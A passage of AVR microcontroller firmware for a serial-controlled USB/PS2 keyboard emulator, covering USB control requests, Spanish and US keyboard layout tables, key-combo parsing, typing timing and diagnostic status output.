      if (len > wLength) len = wLength;
      ep0_send_ram(addr, len);
      return;
    }

    const uint8_t *addr = 0;
    uint16_t len = 0;
    if (type == 1) { addr = device_descriptor; len = sizeof(device_descriptor); }
    else if (type == 0x22) { addr = rd; len = rdlen; }
#if USB_USE_STRINGS
    else if (type == 3) {
      if (idx == 0) { addr = string0; len = sizeof(string0); }
      else if (idx == 1) { addr = string1; len = sizeof(string1); }
      else if (idx == 2) { addr = string2; len = sizeof(string2); }
    }
#endif
    if (addr == 0) { ep0_stall(); return; }
    if (len > wLength) len = wLength;
    ep0_send_pgm(addr, len);
    return;
  }

  if (bRequest == 5 && bmRequestType == 0) {
    dbg_setaddr = 1;
    UEINTX = (uint8_t)~(1 << TXINI);
    while (!(UEINTX & (1 << TXINI))) { }
    UDADDR = (uint8_t)((wValue & 0x7F) | (1 << ADDEN));
    return;
  }

  if (bRequest == 9 && bmRequestType == 0) {
    dbg_setconfig = 1;
    usb_configuration = (uint8_t)wValue;
    UEINTX = (uint8_t)~(1 << TXINI);
    /* Free all non-control endpoints first, then allocate in order. The AVR endpoint DPRAM is
       order-dependent: allocating EP2 on top of a stale EP1 allocation corrupts EP1's FIFO. */
    for (uint8_t e = 6; e >= 1; e--) { UENUM = e; UECONX &= (uint8_t)~(1 << EPEN); UECFG1X &= (uint8_t)~(1 << ALLOC); }
    UENUM = 1;
    UECONX = (1 << EPEN);
    UECFG0X = (1 << EPTYPE1) | (1 << EPDIR);
    UECFG1X = (uint8_t)(fmt_epsize_bits() | (1 << ALLOC));
    UERST = (1 << 1);
    UERST = 0;
    if (fmt_two_if()) {
      UENUM = 2;
      UECONX = (1 << EPEN);
      UECFG0X = (1 << EPTYPE1) | (1 << EPDIR);
      UECFG1X = (uint8_t)(twoif_ep2_epsize_bits() | (1 << ALLOC));
      UERST = (1 << 2);
      UERST = 0;
    }
    UENUM = 0;
    return;
  }

  if (bRequest == 8 && bmRequestType == 0x80) {
    uint8_t c = usb_configuration;
    ep0_send_ram(&c, 1);
    return;
  }

  if (bRequest == 0 && (bmRequestType == 0x80 || bmRequestType == 0x82)) {
    uint8_t st[2] = { 0, 0 };
    ep0_send_ram(st, 2);
    return;
  }

  if ((bRequest == 1 || bRequest == 3) && (bmRequestType == 0x00 || bmRequestType == 0x02)) {
    UEINTX = (uint8_t)~(1 << TXINI);
    return;
  }

  if (wIndex == 0 || (fmt_two_if() && wIndex == 1)) {
    if (bmRequestType == 0xA1) {
      if (bRequest == 1) { uint8_t rb[REPORT_MAX]; uint8_t rn = build_input_report(rb, 0); ep0_send_ram(rb, rn); return; }
      if (bRequest == 2) { uint8_t v = hid_idle; ep0_send_ram(&v, 1); return; }
      if (bRequest == 3) { uint8_t v = hid_protocol; ep0_send_ram(&v, 1); return; }
    }
    if (bmRequestType == 0x21) {
      if (bRequest == 0x0A) { hid_idle = (uint8_t)(wValue >> 8); UEINTX = (uint8_t)~(1 << TXINI); return; }
      if (bRequest == 0x0B) { hid_protocol = (uint8_t)(wValue & 0xFF); UEINTX = (uint8_t)~(1 << TXINI); return; }
      if (bRequest == 0x09) {
        while (!(UEINTX & (1 << RXOUTI))) { }
        uint8_t v = 0;
        for (uint16_t i = 0; i < wLength && i < 8; i++) v = UEDATX;
        if (wLength > 0) hid_leds = v;   /* last byte is the LED bitmap, skipping any report-ID prefix */
        UEINTX = (uint8_t)~(1 << RXOUTI);
        UEINTX = (uint8_t)~(1 << TXINI);
        return;
      }
    }
  }

  ep0_stall();
}

struct CharMap {
  uint16_t cp;
  uint8_t deadKey;
  uint8_t deadMod;
  uint8_t key;
  uint8_t mod;
};

static const struct CharMap CHARMAP_ES[] PROGMEM = {
  {0x0020, 0,0, 0x2C, MOD_NONE},
  {0x0021, 0,0, 0x1E, MOD_SHIFT},
  {0x0022, 0,0, 0x1F, MOD_SHIFT},
  {0x0023, 0,0, 0x20, MOD_ALTGR},
  {0x0024, 0,0, 0x21, MOD_SHIFT},
  {0x0025, 0,0, 0x22, MOD_SHIFT},
  {0x0026, 0,0, 0x23, MOD_SHIFT},
  {0x0027, 0,0, 0x2D, MOD_NONE},
  {0x0028, 0,0, 0x25, MOD_SHIFT},
  {0x0029, 0,0, 0x26, MOD_SHIFT},
  {0x002A, 0,0, 0x30, MOD_SHIFT},
  {0x002B, 0,0, 0x30, MOD_NONE},
  {0x002C, 0,0, 0x36, MOD_NONE},
  {0x002D, 0,0, 0x38, MOD_NONE},
  {0x002E, 0,0, 0x37, MOD_NONE},
  {0x002F, 0,0, 0x24, MOD_SHIFT},
  {0x003A, 0,0, 0x37, MOD_SHIFT},
  {0x003B, 0,0, 0x36, MOD_SHIFT},
  {0x003C, 0,0, 0x64, MOD_NONE},
  {0x003D, 0,0, 0x27, MOD_SHIFT},
  {0x003E, 0,0, 0x64, MOD_SHIFT},
  {0x003F, 0,0, 0x2D, MOD_SHIFT},
  {0x0040, 0,0, 0x1F, MOD_ALTGR},
  {0x005B, 0,0, 0x2F, MOD_ALTGR},
  {0x005C, 0,0, 0x35, MOD_ALTGR},
  {0x005D, 0,0, 0x30, MOD_ALTGR},
  {0x005E, DEAD_GRAVE, MOD_SHIFT, 0x2C, MOD_NONE},
  {0x005F, 0,0, 0x38, MOD_SHIFT},
  {0x0060, DEAD_GRAVE, MOD_NONE, 0x2C, MOD_NONE},
  {0x007B, 0,0, 0x34, MOD_ALTGR},
  {0x007C, 0,0, 0x1E, MOD_ALTGR},
  {0x007D, 0,0, 0x31, MOD_ALTGR},
  {0x007E, DEAD_TILDE, MOD_ALTGR, 0x2C, MOD_NONE},
  {0x00A0, 0,0, 0x2C, MOD_NONE},
  {0x00A1, 0,0, 0x2E, MOD_NONE},
  {0x00A8, DEAD_ACUTE, MOD_SHIFT, 0x2C, MOD_NONE},
  {0x00AA, 0,0, 0x35, MOD_SHIFT},
  {0x00AC, 0,0, 0x23, MOD_ALTGR},
  {0x00B4, DEAD_ACUTE, MOD_NONE, 0x2C, MOD_NONE},
  {0x00B7, 0,0, 0x20, MOD_SHIFT},
  {0x00BA, 0,0, 0x35, MOD_NONE},
  {0x00BF, 0,0, 0x2E, MOD_SHIFT},
  {0x00C7, 0,0, 0x31, MOD_SHIFT},
  {0x00D1, 0,0, 0x33, MOD_SHIFT},
  {0x00E7, 0,0, 0x31, MOD_NONE},
  {0x00F1, 0,0, 0x33, MOD_NONE},
  {0x20AC, 0,0, 0x08, MOD_ALTGR},
  {0x00E1, DEAD_ACUTE, MOD_NONE, 0x04, MOD_NONE},
  {0x00C1, DEAD_ACUTE, MOD_NONE, 0x04, MOD_SHIFT},
  {0x00E9, DEAD_ACUTE, MOD_NONE, 0x08, MOD_NONE},
  {0x00C9, DEAD_ACUTE, MOD_NONE, 0x08, MOD_SHIFT},
  {0x00ED, DEAD_ACUTE, MOD_NONE, 0x0C, MOD_NONE},
  {0x00CD, DEAD_ACUTE, MOD_NONE, 0x0C, MOD_SHIFT},
  {0x00F3, DEAD_ACUTE, MOD_NONE, 0x12, MOD_NONE},
  {0x00D3, DEAD_ACUTE, MOD_NONE, 0x12, MOD_SHIFT},
  {0x00FA, DEAD_ACUTE, MOD_NONE, 0x18, MOD_NONE},
  {0x00DA, DEAD_ACUTE, MOD_NONE, 0x18, MOD_SHIFT},
  {0x00FC, DEAD_ACUTE, MOD_SHIFT, 0x18, MOD_NONE},
  {0x00DC, DEAD_ACUTE, MOD_SHIFT, 0x18, MOD_SHIFT},
  {0x00EF, DEAD_ACUTE, MOD_SHIFT, 0x0C, MOD_NONE},
  {0x00EB, DEAD_ACUTE, MOD_SHIFT, 0x08, MOD_NONE},
  {0x00E0, DEAD_GRAVE, MOD_NONE, 0x04, MOD_NONE},
  {0x00E8, DEAD_GRAVE, MOD_NONE, 0x08, MOD_NONE},
  {0x00EC, DEAD_GRAVE, MOD_NONE, 0x0C, MOD_NONE},
  {0x00F2, DEAD_GRAVE, MOD_NONE, 0x12, MOD_NONE},
  {0x00F9, DEAD_GRAVE, MOD_NONE, 0x18, MOD_NONE},
  {0x00E2, DEAD_GRAVE, MOD_SHIFT, 0x04, MOD_NONE},
  {0x00EA, DEAD_GRAVE, MOD_SHIFT, 0x08, MOD_NONE},
  {0x00EE, DEAD_GRAVE, MOD_SHIFT, 0x0C, MOD_NONE},
  {0x00F4, DEAD_GRAVE, MOD_SHIFT, 0x12, MOD_NONE},
  {0x00FB, DEAD_GRAVE, MOD_SHIFT, 0x18, MOD_NONE},
  {0x00E3, DEAD_TILDE, MOD_ALTGR, 0x04, MOD_NONE},
  {0x00F5, DEAD_TILDE, MOD_ALTGR, 0x12, MOD_NONE},
  {0x2013, 0,0, 0x38, MOD_NONE},
  {0x2014, 0,0, 0x38, MOD_NONE},
  {0x2018, 0,0, 0x2D, MOD_NONE},
  {0x2019, 0,0, 0x2D, MOD_NONE},
  {0x201C, 0,0, 0x1F, MOD_SHIFT},
  {0x201D, 0,0, 0x1F, MOD_SHIFT},
};
#define CHARMAP_ES_LEN (sizeof(CHARMAP_ES) / sizeof(CHARMAP_ES[0]))

/* US ANSI has no dead keys and no accented characters, so anything outside this table is
   dropped and counted in OK SKIP <n>. */
static const struct CharMap CHARMAP_US[] PROGMEM = {
  {0x0020, 0,0, 0x2C, MOD_NONE},
  {0x0021, 0,0, 0x1E, MOD_SHIFT},
  {0x0022, 0,0, 0x34, MOD_SHIFT},
  {0x0023, 0,0, 0x20, MOD_SHIFT},
  {0x0024, 0,0, 0x21, MOD_SHIFT},
  {0x0025, 0,0, 0x22, MOD_SHIFT},
  {0x0026, 0,0, 0x24, MOD_SHIFT},
  {0x0027, 0,0, 0x34, MOD_NONE},
  {0x0028, 0,0, 0x26, MOD_SHIFT},
  {0x0029, 0,0, 0x27, MOD_SHIFT},
  {0x002A, 0,0, 0x25, MOD_SHIFT},
  {0x002B, 0,0, 0x2E, MOD_SHIFT},
  {0x002C, 0,0, 0x36, MOD_NONE},
  {0x002D, 0,0, 0x2D, MOD_NONE},
  {0x002E, 0,0, 0x37, MOD_NONE},
  {0x002F, 0,0, 0x38, MOD_NONE},
  {0x003A, 0,0, 0x33, MOD_SHIFT},
  {0x003B, 0,0, 0x33, MOD_NONE},
  {0x003C, 0,0, 0x36, MOD_SHIFT},
  {0x003D, 0,0, 0x2E, MOD_NONE},
  {0x003E, 0,0, 0x37, MOD_SHIFT},
  {0x003F, 0,0, 0x38, MOD_SHIFT},
  {0x0040, 0,0, 0x1F, MOD_SHIFT},
  {0x005B, 0,0, 0x2F, MOD_NONE},
  {0x005C, 0,0, 0x31, MOD_NONE},
  {0x005D, 0,0, 0x30, MOD_NONE},
  {0x005E, 0,0, 0x23, MOD_SHIFT},
  {0x005F, 0,0, 0x2D, MOD_SHIFT},
  {0x0060, 0,0, 0x35, MOD_NONE},
  {0x007B, 0,0, 0x2F, MOD_SHIFT},
  {0x007C, 0,0, 0x31, MOD_SHIFT},
  {0x007D, 0,0, 0x30, MOD_SHIFT},
  {0x007E, 0,0, 0x35, MOD_SHIFT},
  {0x00A0, 0,0, 0x2C, MOD_NONE},
  {0x2013, 0,0, 0x2D, MOD_NONE},
  {0x2014, 0,0, 0x2D, MOD_NONE},
  {0x2018, 0,0, 0x34, MOD_NONE},
  {0x2019, 0,0, 0x34, MOD_NONE},
  {0x201C, 0,0, 0x34, MOD_SHIFT},
  {0x201D, 0,0, 0x34, MOD_SHIFT},
};
#define CHARMAP_US_LEN (sizeof(CHARMAP_US) / sizeof(CHARMAP_US[0]))

struct NamedKey { char name[12]; uint8_t hid; };
static const struct NamedKey NAMED_KEYS[] PROGMEM = {
  {"ENTER",K_ENTER},{"RETURN",K_ENTER},
  {"ESC",K_ESC},{"ESCAPE",K_ESC},
  {"BACKSPACE",K_BSPACE},{"BKSP",K_BSPACE},
  {"TAB",K_TAB},
  {"SPACE",K_SPACE},{"SPACEBAR",K_SPACE},
  {"CAPSLOCK",0x39},
  {"F1",0x3A},{"F2",0x3B},{"F3",0x3C},{"F4",0x3D},{"F5",0x3E},{"F6",0x3F},
  {"F7",0x40},{"F8",0x41},{"F9",0x42},{"F10",0x43},{"F11",0x44},{"F12",0x45},
  {"PRINTSCREEN",0x46},{"PRTSC",0x46},
  {"SCROLLLOCK",0x47},{"PAUSE",0x48},{"BREAK",0x48},
  {"INSERT",0x49},{"INS",0x49},
  {"HOME",0x4A},
  {"PAGEUP",0x4B},{"PGUP",0x4B},
  {"DELETE",0x4C},{"DEL",0x4C},
  {"END",0x4D},
  {"PAGEDOWN",0x4E},{"PGDN",0x4E},
  {"RIGHT",0x4F},{"LEFT",0x50},{"DOWNARROW",0x51},{"UPARROW",0x52},
  {"NUMLOCK",0x53},
  {"KPDIV",0x54},{"KPMUL",0x55},{"KPMINUS",0x56},{"KPPLUS",0x57},
  {"KPENTER",0x58},
  {"KP1",0x59},{"KP2",0x5A},{"KP3",0x5B},{"KP4",0x5C},{"KP5",0x5D},
  {"KP6",0x5E},{"KP7",0x5F},{"KP8",0x60},{"KP9",0x61},{"KP0",0x62},
  {"KPDOT",0x63},
  {"MENU",0x65},{"APP",0x65},
};
#define NAMED_KEYS_LEN (sizeof(NAMED_KEYS) / sizeof(NAMED_KEYS[0]))


/* Put only the typing knobs back to the compiled defaults, which is what RESET does. */
static void set_defaults(void) {
  g_cfg.pressMs = DEF_PRESS_MS;
  g_cfg.gapMs = DEF_GAP_MS;
  g_cfg.settleMs = DEF_SETTLE_MS;
  g_cfg.deadMs = DEF_DEAD_MS;
  g_cfg.jitterMs = DEF_JITTER_MS;
  g_cfg.echo = 1;
  g_cfg.guard = 1;
  g_cfg.capsFix = 1;
}

static uint8_t g_heldMods = 0;
static uint8_t g_heldKeys = 0;
static uint32_t g_heldSince = 0;
static uint32_t g_lastTapAt = 0;

static uint8_t g_busy = 0;
static uint32_t g_rxFlashUntil = 0;
static uint32_t g_bannerAt = 0;
static uint8_t g_bannerLeft = BANNER_REPEATS;

static char g_line[LINE_MAX + 1];
static uint16_t g_lineLen = 0;
static uint8_t g_lineOverflow = 0;
static char g_lastEol = 0;

static uint32_t g_statLines = 0;
static uint32_t g_statTyped = 0;
static uint32_t g_statSkipped = 0;
static uint32_t g_statOverflow = 0;
static uint32_t g_statAborts = 0;

static void led_set(uint8_t on) {
#if LED_ACTIVE_LOW
  if (on) LED_PORT &= (uint8_t)~(1 << LED_BIT);
  else LED_PORT |= (uint8_t)(1 << LED_BIT);
#else
  if (on) LED_PORT |= (uint8_t)(1 << LED_BIT);
  else LED_PORT &= (uint8_t)~(1 << LED_BIT);
#endif
}

static void led_service(void) {
  uint32_t now = millis();
  uint8_t on;

  if (g_rxFlashUntil != 0) {
    if ((int32_t)(now - g_rxFlashUntil) < 0) {
      led_set((uint8_t)(((now / BLINK_RX_MS) & 1) == 0));
      return;
    }
    g_rxFlashUntil = 0;
  }

  if (g_busy) on = 1;
  else if (g_mode == MODE_PS2)
    on = (uint8_t)(ps2_enabled ? 1 : (((now / BLINK_FAST_MS) & 1) == 0));
  else if (!usb_configuration) on = (uint8_t)(((now / BLINK_SLOW_MS) & 1) == 0);
  else if (usb_suspended) on = (uint8_t)(((now / BLINK_FAST_MS) & 1) == 0);
  else on = 1;
  led_set(on);
}

static void busy(uint8_t on) {
  g_busy = on;
  if (on) BUSY_PORT |= (1 << BUSY_BIT);
  else BUSY_PORT &= (uint8_t)~(1 << BUSY_BIT);
  led_service();
}

static void mode_service(void);
static void mode_enter_usb(void);
static void mode_enter_ps2(void);

static void wait_ms(uint32_t ms) {
  uint32_t start = millis();
  for (;;) {
    led_service();
    mode_service();
    ps2_pump();
    wdt_reset();
    if ((uint32_t)(millis() - start) >= ms) return;
  }
}

static void release_everything(void) {
  kb_release_all();
  g_heldMods = 0;
  g_heldKeys = 0;
}

static void hold_service(void) {
  if (g_heldMods == 0 && g_heldKeys == 0) return;
  if ((uint32_t)(millis() - g_heldSince) < HOLD_TIMEOUT_MS) return;
  release_everything();
  OUTP("# auto-release: held keys timed out");
  outEol();
}

static uint8_t link_wait_ready(void) {
  if (g_mode == MODE_PS2) return 1;
  if (!g_cfg.guard) return 1;
  if (g_mode == MODE_USB && usb_ready()) return 1;
  uint32_t start = millis();
  while ((uint32_t)(millis() - start) < USB_WAIT_MS) {
    if (g_mode == MODE_PS2) return 1;
    if (usb_ready()) return 1;
    wait_ms(5);
  }
  return 0;
}

static uint8_t tap(uint8_t mods, uint8_t hid) {
  uint8_t fresh = (uint8_t)(mods & ~g_heldMods);
  if (fresh) { kb_press_mods(fresh); wait_ms(g_cfg.settleMs); }
  uint8_t ok = 1;
  if (hid) {
    if (!kb_press(hid)) { kb_release(hid); if (!kb_press(hid)) ok = 0; }
  }
  wait_ms(g_cfg.pressMs);
  if (hid) kb_release(hid);
  if (fresh) { wait_ms(g_cfg.settleMs); kb_release_mods(fresh); }
  uint16_t jitter = g_cfg.jitterMs ? (uint16_t)((unsigned)rand() % (g_cfg.jitterMs + 1u)) : 0;
  wait_ms((uint16_t)(g_cfg.gapMs + jitter));
  g_lastTapAt = millis();
  return ok;
}

static void hid_warmup(void) {
  if (g_heldMods || g_heldKeys) return;
  if (g_lastTapAt != 0 && (uint32_t)(millis() - g_lastTapAt) < WARMUP_IDLE_MS) return;
  kb_release_all();
  wait_ms(g_cfg.settleMs);
}

/* Caps lock swaps case for letters, plus the two es-ES letter keys that are punctuation on
   US ANSI (0x31 is backslash there, 0x33 is semicolon), which caps must leave alone. */
static uint8_t caps_affected(uint8_t usage) {
  if (usage >= 0x04 && usage <= 0x1D) return 1;
  if (g_cfg.layout != LAYOUT_ES) return 0;
  return (uint8_t)(usage == 0x31 || usage == 0x33);
}

static uint8_t caps_adjust(uint8_t mods, uint8_t usage) {
  if (!g_cfg.capsFix) return mods;
  if (!(hid_leds & KB_LED_CAPS)) return mods;
  if (!caps_affected(usage)) return mods;
  return (uint8_t)(mods ^ MOD_LSHIFT);
}

static uint8_t tap_char(uint8_t mods, uint8_t usage) { return tap(caps_adjust(mods, usage), usage); }

static uint8_t send_char(uint16_t cp) {
  if (cp >= 'a' && cp <= 'z') return tap_char(MOD_NONE, (uint8_t)(0x04 + (cp - 'a')));
  if (cp >= 'A' && cp <= 'Z') return tap_char(MOD_SHIFT, (uint8_t)(0x04 + (cp - 'A')));
  if (cp >= '1' && cp <= '9') return tap(MOD_NONE, (uint8_t)(0x1E + (cp - '1')));
  if (cp == '0') return tap(MOD_NONE, 0x27);
  if (cp == '\t') return tap(MOD_NONE, K_TAB);
  if (cp == '\n') return tap(MOD_NONE, K_ENTER);
  const struct CharMap *tab = (g_cfg.layout == LAYOUT_US) ? CHARMAP_US : CHARMAP_ES;
  uint16_t n = (g_cfg.layout == LAYOUT_US) ? CHARMAP_US_LEN : CHARMAP_ES_LEN;
  for (uint16_t i = 0; i < n; i++) {
    if (pgm_read_word(&tab[i].cp) != cp) continue;
    struct CharMap m;
    memcpy_P(&m, &tab[i], sizeof(m));
    if (m.deadKey) {
      if (!tap(m.deadMod, m.deadKey)) return 0;
      wait_ms(g_cfg.deadMs);
    }
    return tap_char(m.mod, m.key);
  }
  return 0;
}

static uint16_t utf8_next(const char *buf, uint16_t len, uint16_t *i) {
  uint8_t c = (uint8_t)buf[*i];
  if (c < 0x80) { (*i)++; return c; }
  uint8_t extra;
  uint16_t cp;
  if ((c & 0xE0) == 0xC0) { extra = 1; cp = (uint16_t)(c & 0x1F); }
  else if ((c & 0xF0) == 0xE0) { extra = 2; cp = (uint16_t)(c & 0x0F); }
  else if ((c & 0xF8) == 0xF0) { extra = 3; cp = 0; }
  else { (*i)++; return 0xFFFD; }
  if ((uint32_t)(*i) + extra >= (uint32_t)len) { *i = len; return 0xFFFD; }
  for (uint8_t k = 1; k <= extra; k++) {
    uint8_t cc = (uint8_t)buf[*i + k];
    if ((cc & 0xC0) != 0x80) { (*i)++; return 0xFFFD; }
    cp = (uint16_t)((cp << 6) | (cc & 0x3F));
  }
  *i += (uint16_t)(extra + 1);
  if (extra == 3) return 0xFFFD;
  return cp;
}

static uint16_t type_string(const char *s, uint16_t len, uint8_t *aborted) {
  uint16_t i = 0, skipped = 0;
  *aborted = 0;
  srand((unsigned int)millis());
  busy(1);
  hid_warmup();
  while (i < len) {
    if (g_abort) { *aborted = 1; break; }
    uint16_t cp = utf8_next(s, len, &i);
    if (cp == 0xFFFD || !send_char(cp)) { skipped++; g_statSkipped++; }
    else g_statTyped++;
  }
  busy(0);
  return skipped;
}

static void to_upper(char *s) { for (; *s; ++s) if (*s >= 'a' && *s <= 'z') *s = (char)(*s - 32); }

static uint16_t next_token(const char *s, uint16_t len, uint16_t *pos, char *out, uint16_t cap) {
  uint16_t p = *pos;
  while (p < len && (s[p] == ' ' || s[p] == '\t')) p++;
  uint16_t start = p;
  while (p < len && s[p] != ' ' && s[p] != '\t') p++;
  uint16_t n = (uint16_t)(p - start);
  uint16_t c = (n < (uint16_t)(cap - 1)) ? n : (uint16_t)(cap - 1);
  memcpy(out, s + start, c);
  out[c] = '\0';
  *pos = p;
  return n;
}

static uint8_t lookup_named(const char *up) {
  struct NamedKey nk;
  for (uint16_t i = 0; i < NAMED_KEYS_LEN; i++) {
    memcpy_P(&nk, &NAMED_KEYS[i], sizeof(nk));
    if (strcmp(up, nk.name) == 0) return nk.hid;
  }
  return 0;
}

static uint8_t mod_from_name(const char *t) {
  if (!strcmp(t, "CTRL") || !strcmp(t, "CONTROL") || !strcmp(t, "LCTRL")) return MOD_LCTRL;
  if (!strcmp(t, "SHIFT") || !strcmp(t, "LSHIFT")) return MOD_LSHIFT;
  if (!strcmp(t, "ALT") || !strcmp(t, "LALT")) return MOD_LALT;
  if (!strcmp(t, "GUI") || !strcmp(t, "WIN") || !strcmp(t, "WINDOWS") ||
      !strcmp(t, "CMD") || !strcmp(t, "SUPER") || !strcmp(t, "META") || !strcmp(t, "LGUI")) return MOD_LGUI;
  if (!strcmp(t, "ALTGR") || !strcmp(t, "ALTGRAPH") || !strcmp(t, "RALT")) return MOD_RALT;
  if (!strcmp(t, "RCTRL")) return MOD_RCTRL;
  if (!strcmp(t, "RSHIFT")) return MOD_RSHIFT;
  if (!strcmp(t, "RGUI") || !strcmp(t, "RWIN")) return MOD_RGUI;
  return 0;
}

static uint8_t key_from_token(const char *t) {
  if (t[0] && t[1] == '\0') {
    char c = t[0];
    if (c >= 'A' && c <= 'Z') return (uint8_t)(0x04 + (c - 'A'));
    if (c >= '1' && c <= '9') return (uint8_t)(0x1E + (c - '1'));
    if (c == '0') return 0x27;
  }
  return lookup_named(t);
}

static uint8_t hold_key(char *tok, uint8_t down) {
  to_upper(tok);
  uint8_t m = mod_from_name(tok);
  if (m) {
    if (down) { kb_press_mods(m); g_heldMods |= m; }
    else { kb_release_mods(m); g_heldMods = (uint8_t)(g_heldMods & ~m); }
    g_heldSince = millis();
    return 1;
  }
  uint8_t hid = key_from_token(tok);
  if (!hid) return 0;
  if (down) { if (!kb_press(hid)) return 0; if (g_heldKeys < KB_ROLLOVER) g_heldKeys++; }
  else { kb_release(hid); if (g_heldKeys > 0) g_heldKeys--; }
  g_heldSince = millis();
  return 1;
}

static uint8_t parse_combo(char *combo, uint8_t *mods, uint8_t *keyHid) {
  to_upper(combo);
  *mods = 0;
  *keyHid = 0;
  char *start = combo;
  for (;;) {
    char *plus = strchr(start, '+');
    uint8_t last = (plus == 0);
    if (plus) *plus = '\0';
    if (start[0] == '\0') return 0;
    if (!last) {
      uint8_t m = mod_from_name(start);
      if (!m) return 0;
      *mods |= m;
    } else {
      uint8_t m = mod_from_name(start);
      if (m) *mods |= m;
      else { *keyHid = key_from_token(start); if (!*keyHid) return 0; }
    }
    if (last) break;
    start = plus + 1;
  }
  return (uint8_t)((*mods != 0) || (*keyHid != 0));
}

static uint8_t parse_u32(const char *tok, uint32_t *out) {
  if (!tok[0]) return 0;
  uint32_t v = 0;
  for (const char *p = tok; *p; p++) {
    if (*p < '0' || *p > '9') return 0;
    if (v > 429496728UL) return 0;
    v = v * 10UL + (uint32_t)(*p - '0');
  }
  *out = v;
  return 1;
}

static uint8_t parse_hex8(const char *tok, uint8_t *out) {
  if (!tok[0]) return 0;
  const char *p = tok;
  if (p[0] == '0' && (p[1] == 'x' || p[1] == 'X')) p += 2;
  if (!p[0]) return 0;
  uint16_t v = 0;
  for (; *p; p++) {
    char c = *p;
    uint8_t d;
    if (c >= '0' && c <= '9') d = (uint8_t)(c - '0');
    else if (c >= 'a' && c <= 'f') d = (uint8_t)(10 + c - 'a');
    else if (c >= 'A' && c <= 'F') d = (uint8_t)(10 + c - 'A');
    else return 0;
    v = (uint16_t)((v << 4) | d);
    if (v > 0xFF) return 0;
  }
  *out = (uint8_t)v;
  return 1;
}

static uint8_t parse_onoff(char *tok, uint8_t *out) {
  to_upper(tok);
  if (!strcmp(tok, "ON")) { *out = 1; return 1; }
  if (!strcmp(tok, "OFF")) { *out = 0; return 1; }
  return 0;
}

static void out_mode(void) {
  if (g_mode == MODE_PS2) OUTP("ps2");
  else if (g_mode == MODE_USB) OUTP("usb");
  else OUTP("probe");
}

static void print_ps2(void) {
  OUTP("# mode=");
  out_mode();
  OUTP(" pin=");
  if (g_modePin == PIN_USB) OUTP("usb");
  else if (g_modePin == PIN_PS2) OUTP("ps2");
  else OUTP("auto");
  OUTP(" enabled=");
  outU32(ps2_enabled);
  OUTP(" set=");
  outU32(ps2_set);
  OUTP(" leds=0x");
  outHex8(ps2_leds);
  outEol();
  OUTP("# clk=");
  outU32(ps2_clk());
  OUTP(" dat=");
  outU32(ps2_dat());
  OUTP(" pullups=");
  outU32(g_ps2Pullups);
  OUTP(" intpu=");
  outU32(ps2_pullups);
  OUTP(" queued=");
  outU32((uint32_t)((uint8_t)(ps2_txHead - ps2_txTail) & PS2_TX_MASK));
  outEol();
  OUTP("# sent=");
  outU32(ps2_sent);
  OUTP(" cmds=");
  outU32(ps2_cmds);
  OUTP(" lastcmd=0x");
  outHex8(ps2_lastCmd);
  OUTP(" aborts=");
  outU32(ps2_aborts);
  OUTP(" framing=");
  outU32(ps2_framing);
  OUTP(" dropped=");
  outU32(ps2_dropped);
  OUTP(" resends=");
  outU32(ps2_resends);
  outEol();
}

static void out_layout(void) {
  if (g_cfg.layout == LAYOUT_US) OUTP("en-US");
  else OUTP("es-ES");
}

static void print_info(void) {
  OUTP("# " FW_NAME " v" FW_VERSION " layout=");
  out_layout();
  OUTP(" build=" __DATE__ " " __TIME__);
  outEol();
  OUTP("# mode=");
  out_mode();
  OUTP(" ps2 clk=D7 dat=A7 pullups=");
  outU32(g_ps2Pullups);
  OUTP(" enabled=");
  outU32(ps2_enabled);
  OUTP(" board=" BOARD_NAME " led=" LED_NAME " busy=" BUSY_NAME);
  outEol();
  OUTP("# uart=");
  outU32(UART_BAUD);
  OUTP(" 8N1 press=");
  outU32(g_cfg.pressMs);
  OUTP("ms gap=");
  outU32(g_cfg.gapMs);
  OUTP("ms settle=");
  outU32(g_cfg.settleMs);
  OUTP("ms dead=");
  outU32(g_cfg.deadMs);
  OUTP("ms jitter=");
  outU32(g_cfg.jitterMs);
  OUTP("ms echo=");
  outOnOff(g_cfg.echo);
  OUTP(" guard=");
  outOnOff(g_cfg.guard);
  OUTP(" capsfix=");
  outOnOff(g_cfg.capsFix);
  outEol();
  OUTP("# usb=");
  if (!usb_configuration) OUTP("unconfigured");
  else if (usb_suspended) OUTP("suspended");
  else OUTP("ready");
  OUTP(" speed=");
  if (g_lowSpeed) OUTP("low"); else OUTP("full");
  OUTP(" kro=");
  switch (g_cfg.kro) {
    case KRO_NKRO:     OUTP("nkro"); break;
    case KRO_ARRAY:    OUTP("array"); break;
    case KRO_MULTI:    OUTP("multi"); break;
    case KRO_HYBRID:   OUTP("hybrid"); break;
    case KRO_HYBRID2:  OUTP("hybrid2"); break;
    case KRO_CONSUMER: OUTP("consumer"); break;
    case KRO_LSMULTI:  OUTP("lsmulti"); break;
    case KRO_LSCONS:   OUTP("lsconsumer"); break;
    default:           OUTP("boot"); break;
  }
  OUTP(" ep0=");
  outU32(EP0_SIZE);
  OUTP(" bcd=0x");
  outHex8(USB_BCD >> 8);
  outHex8(USB_BCD & 0xFF);
  OUTP(" power=");
  outU32(USB_POWER_MA);
  OUTP("mA interval=");
  outU32(poll_bInterval());
  outEol();
}

static void print_usb(void) {
  OUTP("# vbus=");
  outU32((USBSTA & (1 << VBUS)) ? 1 : 0);
  OUTP(" udaddr=0x");
  outHex8(UDADDR);
  OUTP(" udcon=0x");
  outHex8(UDCON);
  OUTP(" usbcon=0x");
  outHex8(USBCON);
  OUTP(" usbsta=0x");
  outHex8(USBSTA);
  outEol();
  OUTP("# resets=");
  outU32(dbg_resets);
  OUTP(" sof=");
  outU32(dbg_sof);
  OUTP(" setups=");
  outU32(dbg_setups);
  OUTP(" getdesc=");
  outU32(dbg_getdesc);
  OUTP(" setaddr=");
  outU32(dbg_setaddr);
  OUTP(" setconfig=");
  outU32(dbg_setconfig);
  OUTP(" stalls=");
  outU32(dbg_stalls);
  outEol();
  OUTP("# lastreq=0x");
  outHex8(dbg_last_req);
  OUTP(" lastreqtype=0x");
  outHex8(dbg_last_reqtype);
  OUTP(" lastdesc=0x");
  outHex8(dbg_last_desc);
  OUTP(" protocol=");
  if (hid_protocol == 0) OUTP("boot"); else OUTP("report");
  OUTP(" leds=0x");
  outHex8(hid_leds);
  outEol();
  OUTP("# reports ok=");
  outU32(g_reportsOk);
  OUTP(" failed=");
  outU32(g_reportsFail);
  outEol();
  OUTP("# udint_seen=0x");
  outHex8(dbg_udint_seen);
  OUTP(" vbus_changes=");
  outU32(dbg_vbus_changes);
  OUTP(" vbus_last_ms=");
  outU32(dbg_vbus_last_ms);
  OUTP(" suspends=");
  outU32(dbg_suspends);
